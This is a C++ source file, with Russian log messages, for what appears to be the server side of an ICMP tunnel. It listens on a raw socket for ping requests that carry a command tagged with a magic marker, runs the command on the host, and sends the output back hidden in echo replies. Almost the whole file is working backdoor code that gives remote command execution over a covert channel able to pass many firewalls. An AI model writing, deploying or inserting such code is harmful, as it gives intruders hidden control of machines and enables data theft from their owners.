#include <netinet/in.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <unistd.h>

#include <cstring>
#include <iostream>

#include "icmp_tunnel.hpp"

int main() {
    try {
        std::cout << "Запуск ICMP сервера. Ожидание пакетов..." << std::endl;

        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (sockfd < 0)
            throw tunnel::NetworkException("Не удалось создать сокет, необходим запуск с root");

        std::vector<uint8_t> buffer(1024);
        struct sockaddr_in client_addr;
        socklen_t addr_len = sizeof(client_addr);

        while (true) {
            ssize_t bytes_received = recvfrom(sockfd, buffer.data(), buffer.size(), 0,
                                              (struct sockaddr*)&client_addr, &addr_len);
            if (bytes_received <= 0) continue;

            struct iphdr* ip = reinterpret_cast<struct iphdr*>(buffer.data());
            int ip_header_len = ip->ihl * 4;
            struct icmphdr* icmp = reinterpret_cast<struct icmphdr*>(buffer.data() + ip_header_len);

            if (icmp->type == ICMP_ECHO) {
                int icmp_data_offset = ip_header_len + sizeof(struct icmphdr);
                int data_len = bytes_received - icmp_data_offset;

                std::vector<uint8_t> payload(buffer.begin() + icmp_data_offset,
                                             buffer.begin() + icmp_data_offset + data_len);

                std::string command =
                    tunnel::IcmpUtils::extract_payload(payload, tunnel::IcmpUtils::MAGIC_REQ);
                if (!command.empty()) {
                    std::cout << "Выполнение команды: " << command << std::endl;

                    std::string exec_result = tunnel::IcmpUtils::execute_command(command);
                    std::vector<uint8_t> reply_data =
                        tunnel::IcmpUtils::wrap_payload(exec_result, tunnel::IcmpUtils::MAGIC_RES);
                    tunnel::IcmpUtils::validate_payload_size(reply_data.size());

                    icmp->type = ICMP_ECHOREPLY;
                    icmp->checksum = 0;

                    std::vector<uint8_t> reply_packet(sizeof(struct icmphdr) + reply_data.size());
                    std::memcpy(reply_packet.data(), icmp, sizeof(struct icmphdr));
                    std::memcpy(reply_packet.data() + sizeof(struct icmphdr), reply_data.data(),
                                reply_data.size());

                    reinterpret_cast<struct icmphdr*>(reply_packet.data())->checksum =
                        tunnel::IcmpUtils::calculate_checksum(reply_packet);

                    sendto(sockfd, reply_packet.data(), reply_packet.size(), 0,
                           (struct sockaddr*)&client_addr, addr_len);
                    std::cout << "Результат отправлен." << std::endl;
                }
            }
        }
    } catch (const std::exception& e) {
        std::cerr << "Ошибка: " << e.what() << std::endl;
        return 1;
    }
    return 0;
}
